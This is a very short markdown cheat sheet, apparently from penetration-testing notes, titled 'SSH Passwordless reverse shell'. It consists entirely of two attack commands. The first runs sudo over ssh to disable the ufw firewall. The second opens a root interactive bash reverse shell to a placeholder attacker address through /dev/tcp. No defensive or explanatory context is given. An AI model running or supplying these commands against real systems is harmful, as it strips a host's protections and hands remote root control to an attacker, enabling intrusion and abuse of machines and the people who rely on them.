# SSH Passwordless reverse shell

## Requirements:

The user can run sudo

### 1) Disable firewall if it exists

    ssh user@localhost sudo ufw disable

### 2) Setup a listener and run the reverse shell

    ssh user@localhost sudo bash -i >& /dev/tcp/ATTACK_IP/PORT 0>&1
